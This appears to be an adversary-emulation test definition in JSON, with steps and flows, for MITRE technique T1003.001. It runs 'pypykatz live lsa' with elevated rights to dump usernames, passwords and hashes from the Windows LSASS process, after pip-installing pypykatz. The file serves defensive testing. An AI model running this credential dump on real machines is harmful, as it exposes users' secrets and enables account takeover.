{
  "id": "c37bc535-5c62-4195-9cc3-0517673171d8",
  "name": "LSASS read with pypykatz",
  "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "01540fac-6c97-41be-a865-7cc2ca1fbbbd",
      "type": "execute-command",
      "data": {
        "command": "pypykatz live lsa\n",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "cc1de6a9-7738-4c91-88ac-eb747e31333a",
      "name": "Check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "f1c664f6-f5cc-4477-964d-752d0518d415",
      "name": "Resolve dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"Python 3 must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "078fe896-3c8f-4936-b02b-d38e4f638bba",
      "name": "Re-check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "9938e953-529f-4a10-a4be-aab376cff147",
      "name": "Check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "b29bb598-b9dc-43e1-8f7e-20a31f9a3c52",
      "name": "Resolve dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"PIP must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "4fe5f575-5549-4713-a54b-0545c44b5c7a",
      "name": "Re-check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "48c59251-60f8-4c51-aeaf-e33fbe18a106",
      "name": "Check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "1f991930-92bd-4471-9c91-6de82d1e734a",
      "name": "Resolve dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pip install pypykatz\n",
        "command_type": ""
      },
      "elevation_required": true
    },
    {
      "id": "b510d2fd-a65c-4d33-8a69-c1fd1dff6192",
      "name": "Re-check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "cc1de6a9-7738-4c91-88ac-eb747e31333a",
      "p": "on-success",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    },
    {
      "s": "cc1de6a9-7738-4c91-88ac-eb747e31333a",
      "p": "on-failure",
      "o": "f1c664f6-f5cc-4477-964d-752d0518d415"
    },
    {
      "s": "f1c664f6-f5cc-4477-964d-752d0518d415",
      "p": "on-success",
      "o": "078fe896-3c8f-4936-b02b-d38e4f638bba"
    },
    {
      "s": "078fe896-3c8f-4936-b02b-d38e4f638bba",
      "p": "on-failure",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    },
    {
      "s": "9938e953-529f-4a10-a4be-aab376cff147",
      "p": "on-success",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    },
    {
      "s": "9938e953-529f-4a10-a4be-aab376cff147",
      "p": "on-failure",
      "o": "b29bb598-b9dc-43e1-8f7e-20a31f9a3c52"
    },
    {
      "s": "b29bb598-b9dc-43e1-8f7e-20a31f9a3c52",
      "p": "on-success",
      "o": "4fe5f575-5549-4713-a54b-0545c44b5c7a"
    },
    {
      "s": "4fe5f575-5549-4713-a54b-0545c44b5c7a",
      "p": "on-failure",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    },
    {
      "s": "48c59251-60f8-4c51-aeaf-e33fbe18a106",
      "p": "on-success",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    },
    {
      "s": "48c59251-60f8-4c51-aeaf-e33fbe18a106",
      "p": "on-failure",
      "o": "1f991930-92bd-4471-9c91-6de82d1e734a"
    },
    {
      "s": "1f991930-92bd-4471-9c91-6de82d1e734a",
      "p": "on-success",
      "o": "b510d2fd-a65c-4d33-8a69-c1fd1dff6192"
    },
    {
      "s": "b510d2fd-a65c-4d33-8a69-c1fd1dff6192",
      "p": "on-failure",
      "o": "01540fac-6c97-41be-a865-7cc2ca1fbbbd"
    }
  ],
  "tags": [
    "T1003",
    "T1003.001"
  ]
}